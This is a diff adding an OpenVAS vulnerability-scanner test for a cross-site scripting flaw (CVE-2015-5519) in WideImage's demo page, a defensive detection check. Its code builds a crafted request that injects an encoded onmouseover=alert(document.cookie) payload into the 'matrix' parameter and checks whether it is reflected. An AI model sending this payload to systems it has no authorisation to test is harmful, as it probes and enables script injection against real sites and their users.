@@ -1,0 +1,118 @@
+###############################################################################
+# OpenVAS Vulnerability Test
+# $Id: gb_wideimage_demo_code_xss_vuln.nasl 2580 2016-02-05 08:23:59Z benallard $
+#
+# WideImage Demo Code Cross Site Scripting Vulnerability
+#
+# Authors:
+# Rinu Kuriakose <krinu@secpod.com>
+#
+# Copyright:
+# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
+#
+# This program is free software; you can redistribute it and/or modify
+# it under the terms of the GNU General Public License version 2
+# (or any later version), as published by the Free Software Foundation.
+#
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program; if not, write to the Free Software
+# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
+###############################################################################
+
+CPE = "cpe:/a:wideimage:wideimage";
+
+if(description)
+{
+  script_oid("1.3.6.1.4.1.25623.1.0.805683");
+  script_version("$Revision: 2580 $");
+  script_cve_id("CVE-2015-5519");
+  script_tag(name:"cvss_base", value:"4.3");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
+  script_tag(name:"last_modification", value:"$Date: 2016-02-05 09:23:59 +0100 (Fri, 05 Feb 2016) $");
+  script_tag(name:"creation_date", value:"2015-08-03 12:38:23 +0530 (Mon, 03 Aug 2015)");
+  script_tag(name:"qod_type", value:"remote_vul");
+  script_name("WideImage Demo Code Cross Site Scripting Vulnerability");
+
+  script_tag(name:"summary", value:"This host is installed with WideImage
+  and is prone to cross site scripting vulnerability.");
+
+  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
+  check whether it is able to read cookie or not.");
+
+  script_tag(name:"insight", value:"Flaw exists as the application does not
+  validate input passed via 'matrix parameter' to demo/index.php script before
+  returning it to user.");
+
+  script_tag(name:"impact", value:"Successful exploitation will allow a
+  context-dependent attacker to create a specially crafted request that would
+  execute arbitrary script code in a user's browser session within the trust
+  relationship between their browser and the server.
+
+  Impact Level: Application");
+
+  script_tag(name:"affected", value:"WideImage version 11.02.19");
+
+  script_tag(name: "solution" , value:"Remove the 'test' and 'demo' directories
+  after installation. For updates refer to http://wideimage.sourceforge.net/");
+
+  script_tag(name:"solution_type", value:"Workaround");
+
+  script_xref(name : "URL" , value : "http://www.scip.ch/en/?vuldb.76509");
+  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2015/Jul/30");
+  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/132584");
+
+  script_summary("Check if WideImage is prone to XSS");
+  script_category(ACT_ATTACK);
+  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
+  script_family("Web application abuses");
+  script_dependencies("gb_wideimage_detect.nasl");
+  script_mandatory_keys("WideImage/installed");
+  script_require_ports("Services/www", 80);
+  exit(0);
+}
+
+
+include("http_func.inc");
+include("host_details.inc");
+include("http_keepalive.inc");
+
+# Variable Initialization
+dir = "";
+url = "";
+http_port = "";
+
+# Get HTTP Port
+if(!http_port = get_app_port(cpe:CPE)){
+  exit(0);
+}
+
+## Check Host Supports PHP
+if(!can_host_php(port:http_port)){
+  exit(0);
+}
+
+## Get Application Location
+if(!dir = get_app_location(cpe:CPE, port:http_port)){
+  exit(0);
+}
+
+##Construct Attack Request
+url = dir + "/demo/?colors=255&demo=applyConvolution&dither=1&dither_cb=1&div=1&"+
+            "match_palette=1&match_palette_cb=1&matrix=2%25200%25200%252c%2"+
+            "5200%2520-1%25200%252c%25200%25200%2520-1%22%20onmouseover%3d"+
+            "alert%28document.cookie%29%20bad%3d%22&offset=220&output=preset"+
+            "%20for%20demo";
+
+## Try attack and check the response to confirm vulnerability
+if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
+                   pattern:"alert\(document.cookie\)", extra_check:">WideImage"))
+{
+  report = report_vuln_url( port:http_port, url:url );
+  security_message(port:http_port, data:report);
+  exit(0);
+}
